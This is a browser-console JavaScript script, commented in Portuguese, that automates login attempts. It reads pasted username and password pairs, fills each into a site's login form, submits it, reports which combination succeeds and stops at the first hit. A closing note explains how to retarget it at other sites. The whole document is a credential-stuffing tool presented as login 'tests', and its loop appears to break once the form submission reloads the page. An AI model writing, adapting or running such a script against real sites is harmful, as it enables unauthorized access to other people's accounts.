// Função para receber a lista de logins do usuário através de um prompt.
function receberListaDeLogins() {
    const listaDeLogins = prompt("Insira a lista de logins (usuário | senha), separados por vírgula:\nExemplo: pedro1 | senha1, maria2 | senha2");
    if (!listaDeLogins) {
        console.log("%c[INFO] Nenhuma lista de logins fornecida. Encerrando.", "color: DimGray");
        return null;
    }
    return listaDeLogins.split(',');
}

// Lista de usuários e senhas para testar.
const logins = receberListaDeLogins(); // Recebe a lista de logins do usuário.
const usuarios = [];
const senhas = [];

// Processa a lista de logins e preenche os arrays de usuários e senhas.
if (logins) {
    logins.forEach(login => {
        const [usuario, senha] = login.trim().split('|');
        if (usuario && senha) {
            usuarios.push(usuario.trim());
            senhas.push(senha.trim());
        } else {
            console.warn("%c[AVISO] Formato de login inválido:", login, "color: Orange");
        }
    });
}

// Tenta o login com um usuário e senha.
async function tentarLogin(usuario, senha) {
    // Encontra os campos e o formulário (ADAPTAR OS SELECTORES!).
    const usuarioInput = document.querySelector('input[name="login"]');
    const senhaInput = document.querySelector('input[name="pass"]');
    const form = document.querySelector('form[action="logar.php"]');

    if (!usuarioInput || !senhaInput || !form) {
        console.error("%c[ERRO] Elementos do formulário não encontrados. Verifique os seletores!", "color: Crimson");
        return false; // Elementos não encontrados.
    }

    usuarioInput.value = usuario;
    senhaInput.value = senha;
    form.submit();

    await new Promise(resolve => setTimeout(resolve, 2000)); // Aguarda (AJUSTAR O TEMPO).

    // Verifica se o login foi bem-sucedido (ADAPTAR A LÓGICA!).
    const painelUsuario = document.querySelector('#painel_usuario');
    if (painelUsuario) {
        console.log(`%c[SUCESSO] Login com ${usuario}/${senha}`, 'color: Green'); // Login bem-sucedido!
        return true;
    } else {
        console.error(`%c[FALHA] Login com ${usuario}/${senha}`, 'color: Red'); // Login falhou!
        return false;
    }
}

// Executa os testes de login.
async function executarTestes() {
    if (usuarios.length === 0) {
        console.log("%c[INFO] Nenhum usuário/senha válido fornecido. Encerrando.", "color: DimGray");
        return;
    }

    console.group("%cIniciando Testes de Login", "color: Navy; font-weight: bold;");

    for (let i = 0; i < usuarios.length; i++) {
        const usuario = usuarios[i];
        const senha = senhas[i];

        console.log(`%c[TESTE] Tentando ${usuario}/${senha}`, 'color: RoyalBlue');

        if (await tentarLogin(usuario, senha)) {
            console.groupEnd(); // Encerra o grupo de logs
            return; // Para ao encontrar um login válido.
        }
    }

    console.groupEnd();
    console.log('%c[FALHA] Nenhuma combinação funcionou.', 'color: Red');
}

executarTestes();

/* **Adaptando para outro site:**
1. Inspecione o HTML do login.
2. Adapte os seletores CSS em `tentarLogin()`.
3. Adapte a lógica de sucesso em `tentarLogin()`.
4. Ajuste o tempo de espera.
*/